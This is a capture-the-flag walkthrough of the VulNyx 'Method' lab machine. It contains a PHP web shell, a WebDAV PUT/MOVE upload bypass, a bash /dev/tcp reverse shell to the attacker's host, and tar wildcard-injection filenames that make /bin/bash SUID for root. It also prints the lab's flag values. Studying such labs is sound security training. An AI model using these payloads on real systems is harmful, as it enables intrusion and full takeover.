# [VulNyx](https://vulnyx.com/): Method Writeup  

<img width="850" height="437" alt="image" src="https://github.com/user-attachments/assets/0ffb6c5f-37c0-41a9-a3f3-587ab8f8ba0c" />

---

# 🎯 Target Information

- **Platform:** VulNyx
- **Machine Name:** Method
- **Difficulty:** Medium
- **Key Vulnerabilities:**
  - WebDAV Misconfiguration
  - File Upload Bypass
  - Remote Code Execution (RCE)
  - Tar Wildcard (Glob) Argument Injection
  - Privilege Escalation

---

# 🔍 Network Discovery

First, scan the local network to identify the target machine.

```bash
sudo arp-scan --localnet
```

## Result

```bash
$ sudo arp-scan  --localnet     
[sudo] password for arc: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:8d:a8:e2, IPv4: 192.168.29.56
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.29.1    d8:78:c9:99:bc:d9       (Unknown)
192.168.29.245  00:0c:29:eb:4f:b1       (Unknown)
192.168.29.205  00:f1:f3:f9:16:4e       (Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.040 seconds (125.49 hosts/sec). 3 responded
```

The target IP address is:

```text
192.168.29.245
```

---

# 🔎 Enumeration

Perform a full TCP port scan.

```bash
nmap -n -Pn -sVC -p- --min-rate 5000 192.168.29.245
```

## Scan Results

```text
$ nmap -n -Pn -sVC -p- --min-rate 5000 192.168.29.243    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-16 04:21 -0700
Nmap scan report for 192.168.29.243
Host is up (0.0013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u7 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    lighttpd 1.4.59
|_http-title: Welcome page
|_http-server-header: lighttpd/1.4.59
MAC Address: 00:0C:29:EB:4F:B1 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.60 seconds
```

### Findings

- **22** → SSH
- **80** → Lighttpd Web Server

---

# 🌐 Web Enumeration

Browse to port **80**.

<img width="1918" height="938" alt="image" src="https://github.com/user-attachments/assets/266e84a6-311f-41c4-a1b0-a469d084e85e" />

The web server displays the default **Lighttpd** welcome page.

Next, enumerate directories using Gobuster.

```bash
gobuster dir -u http://192.168.29.245 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

## Result

```bash
$ gobuster dir -u http://192.168.29.243 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.29.243
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
webdav               (Status: 301) [Size: 0] [--> /webdav/]
Progress: 4751 / 4751 (100.00%)
===============================================================
Finished
===============================================================
```

Browsing to `/webdav/` returns a **403 Forbidden** response.

<img width="1663" height="359" alt="403" src="https://github.com/user-attachments/assets/11509ff2-026d-4d45-85dd-91d00f93a1b9" />

Although access is denied, this confirms that the server is using **WebDAV**.

---

# 🔍 Enumerating WebDAV

Check the allowed HTTP methods.

```bash
curl -v -X OPTIONS http://192.168.29.245/webdav/
```

## Result

```bash
$ curl -v -X OPTIONS http://192.168.29.245/webdav/
*   Trying 192.168.29.245:80...
* Established connection to 192.168.29.245 (192.168.29.245 port 80) from 192.168.29.56 port 47946 
* using HTTP/1.x
> OPTIONS /webdav/ HTTP/1.1
> Host: 192.168.29.245
> User-Agent: curl/8.20.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< DAV: 1,2,3
< MS-Author-Via: DAV
< Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK, OPTIONS, GET, HEAD, POST
< Content-Length: 0
< Date: Fri, 17 Jul 2026 08:56:29 GMT
< Server: lighttpd/1.4.59
< 
* Connection #0 to host 192.168.29.245:80 left intact
```

The server supports several WebDAV methods, including **PUT** and **MOVE**.

---

# 🚀 Initial File Upload Attempt

Create a simple PHP web shell.

```php
<html>
<body>
<form method="GET">
<input type="text" name="cmd">
<input type="submit">
</form>

<pre>
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
</pre>

</body>
</html>
```

Save it as:

```text
shell.txt
```

Attempt to upload it.

```bash
curl -X PUT --upload-file shell.txt http://192.168.29.245/webdav/shell.txt
```

## Result

```text
$ curl  -X PUT --upload-file shell.txt http://192.168.29.245/webdav/shell.txt 
<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>403 Forbidden</title>
 </head>
 <body>
  <h1>403 Forbidden</h1>
 </body>
</html>
```
403 Forbidden.
Although the server advertises the PUT method, direct uploads are denied.

---

# 🔍 Testing WebDAV with DavTest

Use **DavTest** to determine which file types are accepted.

```bash
davtest --url http://192.168.29.245/webdav
```

## Result

```text
$ davtest --url http://192.168.29.245/webdav
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://192.168.29.245/webdav
********************************************************
NOTE    Random string for this session: PUVW1Q9xI
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://192.168.29.245/webdav/DavTestDir_PUVW1Q9xI
********************************************************
 Sending test files
PUT     jsp     FAIL
PUT     php     FAIL
PUT     aspx    FAIL
PUT     html    SUCCEED:        http://192.168.29.245/webdav/DavTestDir_PUVW1Q9xI/davtest_PUVW1Q9xI.html
PUT     txt     FAIL
PUT     jhtml   FAIL
PUT     asp     FAIL
PUT     cfm     FAIL
PUT     pl      FAIL
PUT     cgi     FAIL
PUT     shtml   FAIL
********************************************************
 Checking for test file execution
EXEC    html    FAIL

********************************************************
```

Only **HTML** files can be uploaded.

---

# 📤 Uploading the Web Shell

Rename the web shell.

```bash
mv shell.php shell.html
```

Upload it again.

```bash
curl -X PUT --upload-file shell.html http://192.168.29.245/webdav/shell.html
```

## Result

```text
$ curl -v -X PUT --upload-file shell.html http:/192.168.29.245/webdav/shell.html
Note: Unnecessary use of -X or --request, PUT is already inferred.
*   Trying 192.168.29.245:80...
* Established connection to 192.168.29.245 (192.168.29.245 port 80) from 192.168.29.56 port 44702 
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
  0      0   0      0   0      0      0      0                              0* using HTTP/1.x
> PUT /webdav/shell.html HTTP/1.1
> Host: 192.168.29.245
> User-Agent: curl/8.20.0
> Accept: */*
> Content-Length: 347
> 
} [347 bytes data]
* upload completely sent off: 347 bytes
< HTTP/1.1 201 Created
< ETag: "3453640711"
< Content-Length: 0
< Date: Fri, 17 Jul 2026 09:17:55 GMT
< Server: lighttpd/1.4.59
< 
100    347   0      0 100    347      0  64811                              0
* Connection #0 to host 192.168.29.245:80 left intact
```

The upload succeeds.

<img width="1653" height="324" alt="uploaded" src="https://github.com/user-attachments/assets/141807a2-e627-47e6-bee7-cdf4bc708580" />

Browsing to the uploaded file confirms that it exists, but PHP code is not executed because the file has an `.html` extension.

---

# 🔄 Bypassing the Restriction

Rename the uploaded file using the **MOVE** method.

```bash
curl -X MOVE http://192.168.29.245/webdav/shell.html -H "Destination: http://192.168.29.245/webdav/shell.php"
```

## Result

```text
$ curl -v -X MOVE http://192.168.29.245/webdav/shell.html -H "Destination: http://192.168.29.245/webdav/shell.php"
*   Trying 192.168.29.245:80...
* Established connection to 192.168.29.245 (192.168.29.245 port 80) from 192.168.29.56 port 55782 
* using HTTP/1.x
> MOVE /webdav/shell.html HTTP/1.1
> Host: 192.168.29.245
> User-Agent: curl/8.20.0
> Accept: */*
> Destination: http://192.168.29.245/webdav/shell.php
> 
* Request completely sent off
< HTTP/1.1 201 Created
< Content-Length: 0
< Date: Fri, 17 Jul 2026 09:21:55 GMT
< Server: lighttpd/1.4.59
< 
* Connection #0 to host 192.168.29.245:80 left intact
```

The file is successfully renamed to **shell.php**.

Visiting:

```text
http://192.168.29.245/webdav/shell.php
```

<img width="1643" height="379" alt="got-the" src="https://github.com/user-attachments/assets/5436336f-7ca9-4ea3-9e6b-602df5c10207" />

executes the PHP code.

---

# 💻 Remote Code Execution

Start a Netcat listener.

```bash
nc -lnvp 443
```

Execute the following command through the web shell.

```bash
bash -c "bash -i >& /dev/tcp/192.168.29.56/443 0>&1"
```

## Result

```text
$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.29.56] from (UNKNOWN) [192.168.29.245] 56000
bash: cannot set terminal process group (451): Inappropriate ioctl for device
bash: no job control in this shell
www-data@method:~/html/webdav$ 
```

A reverse shell is successfully obtained as the **www-data** user.

---

# 🔧 Upgrading the Shell

Upgrade the shell to a fully interactive TTY.

```bash
script /dev/null -c bash
```

Press: `Ctrl + Z`

Then execute:

```bash
stty raw -echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

---

# 🏁 User Flag

The user flag is located in the home directory.

```bash
cat /home/www-data/user.txt
```

## Result

```text
www-data@method:~/html/webdav$ cat /home/www-data/user.txt 
5492fc195e7dd4bf3ce4f413674156b6
www-data@method:~/html/webdav$ 
```

---

# 🔍 Privilege Escalation Enumeration

Attempt to check sudo permissions.

```bash
www-data@method:~/html/webdav$ sudo -l
bash: sudo: command not found
```

However, sudo is not installed.

Search for SUID binaries.

```bash
www-data@method:~/html/webdav$ find / -type f -perm -4000 2>/dev/null
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
```

Nothing immediately useful is discovered.

Check cron jobs.

```bash
cat /etc/crontab
```
## Result 
```
www-data@method:~/html/webdav$ cat /etc/crontab       
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```
No useful scheduled tasks are visible.

Search the cron directories.

```bash
ls /etc/cron*
```
```
www-data@method:~/html/webdav$ ls /etc/cron*
cron.d/       cron.hourly/  cron.weekly/  
cron.daily/   cron.monthly/ crontab  
```
Again, nothing interesting is found.

---

# 🔍 Monitoring Processes with pspy

Upload **pspy64** to the target.

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

```bash
chmod +x pspy64
```

Run it.

```bash
./pspy64
```
## Result
```

www-data@method:~/html/webdav$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/07/17 11:46:00 CMD: UID=0     PID=4      | 
2026/07/17 11:46:00 CMD: UID=0     PID=3      | 
2026/07/17 11:46:00 CMD: UID=0     PID=2      | 
2026/07/17 11:46:00 CMD: UID=0     PID=1      | /sbin/init 
2026/07/17 11:46:01 CMD: UID=0     PID=1118   | /usr/sbin/CRON -f 
2026/07/17 11:46:01 CMD: UID=0     PID=1119   | /usr/sbin/CRON -f 
2026/07/17 11:46:01 CMD: UID=0     PID=1120   | /bin/sh -c cd /var/www/html/webdav/ && tar -zcf /var/backups/webdav.tgz * 
2026/07/17 11:46:01 CMD: UID=0     PID=1121   | tar -zcf /var/backups/webdav.tgz DavTestDir_PUVW1Q9xI pspy64 shell.php 
2026/07/17 11:46:01 CMD: UID=0     PID=1122   | /bin/sh -c gzip 
2026/07/17 11:47:01 CMD: UID=0     PID=1123   | /usr/sbin/CRON -f 
2026/07/17 11:47:01 CMD: UID=0     PID=1124   | /usr/sbin/CRON -f 
2026/07/17 11:47:01 CMD: UID=0     PID=1125   | /bin/sh -c cd /var/www/html/webdav/ && tar -zcf /var/backups/webdav.tgz * 
2026/07/17 11:47:01 CMD: UID=0     PID=1126   | tar -zcf /var/backups/webdav.tgz DavTestDir_PUVW1Q9xI pspy64 shell.php 
2026/07/17 11:47:02 CMD: UID=0     PID=1127   | /bin/sh -c gzip 
^CExiting program... (interrupt)

```
After monitoring for a short time, the following command repeatedly appears.

```bash
cd /var/www/html/webdav/ && tar -zcf /var/backups/webdav.tgz *
```

This archive is created every minute by **root**.

This is vulnerable to **Tar Wildcard (Glob) Argument Injection**.

---

# 🚀 Exploiting Tar Wildcard Injection

Verify the permissions of `/bin/bash`.

```bash
ls -la /bin/bash
```
```
www-data@method:~/html/webdav$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
www-data@method:~/html/webdav$ 
```
There no SUID for the bash.

Create a script that sets the SUID bit.

```bash
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /var/www/html/webdav/root_shell.sh
```

Make it executable.

```bash
chmod +x /var/www/html/webdav/root_shell.sh
```

Create the malicious filenames.

```bash
touch "/var/www/html/webdav/--checkpoint-action=exec=sh root_shell.sh"
```

- `touch` → creates an empty file.
- `/var/www/html/webdav/` → the directory where the file is created.
- `--checkpoint-action=exec=sh root_shell.sh` → the filename being created.
- `--checkpoint-action` → a tar option name (not interpreted by touch).
- `exec=sh root_shell.sh` → tells tar what command to run if it mistakenly treats the filename as an option.
- `sh` → runs the shell interpreter.
- `root_shell.sh` → the script file that sh would execute.

Then run

```bash
touch "/var/www/html/webdav/--checkpoint=1"
```

- `touch` → creates an empty file.
- `/var/www/html/webdav/` → the directory where the file is created.
- `--checkpoint=1` → the filename being created.
- `--checkpoint` → a GNU tar option that enables checkpoints.
- `=1` → tells tar to trigger a checkpoint after processing 1 file.

### One-Liner

```bash
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /var/www/html/webdav/our_shell.sh ; chmod +x /var/www/html/webdav/our_shell.sh ; touch "/var/www/html/webdav/--checkpoint-action=exec=sh our_shell.sh" ; touch "/var/www/html/webdav/--checkpoint=1"
```

Wait approximately one minute for the cron job to execute.

### 🙏 Acknowledgements
- InzelSec, **"Linux Privilege Escalation: Cron Jobs"**, Medium: [view](https://medium.com/@inzelsec/linux-privilege-escalation-cron-jobs-9adade81979c)
---

# 🔓 Root Shell

Verify the permissions for the bash.

```bash
ls -la /bin/bash
```

## Result

```text
www-data@method:~/html/webdav$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
www-data@method:~/html/webdav$ 
```

The SUID bit has been set successfully.

Execute Bash with preserved privileges.

```bash
/bin/bash -p
```

Verify the current user.

```bash
www-data@method:~/html/webdav$ /bin/bash -p
bash-5.1# id; whoami ; hostname
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
root
method
bash-5.1# 
```

Successfully obtained a root shell.

---

# 🏁 Root Flag

Read the root flag.

```bash
cat /root/root.txt
```

## Result

```text
bash-5.1# cat /root/root.txt 
370ac5644039db096693f936c2bca98f
bash-5.1# 
```

---

# 🧾 Summary

| Phase | Technique |
|--------|-----------|
| Network Discovery | arp-scan |
| Enumeration | Nmap |
| Directory Enumeration | Gobuster |
| WebDAV Enumeration | OPTIONS |
| File Upload | PUT |
| File Extension Bypass | MOVE |
| Initial Access | PHP Web Shell |
| Shell | Reverse Shell |
| Enumeration | pspy64 |
| Privilege Escalation | Tar Wildcard Argument Injection |
| Root Access | SUID Bash |

---

# 🚀 Key Takeaways

- WebDAV can introduce dangerous attack vectors when file uploads are not properly restricted.
- File extension restrictions can often be bypassed using supported HTTP methods such as **MOVE**.
- Tools like **pspy64** are invaluable for discovering hidden cron jobs and background processes.
- Running `tar` with wildcards inside privileged cron jobs can lead to **Tar Wildcard (Glob) Argument Injection**, resulting in full root compromise.
- Always sanitize wildcard usage in privileged scripts and avoid executing archive commands on attacker-controlled directories.

---

## **Author:** [zer0arc4](https://github.com/zer0arc4)
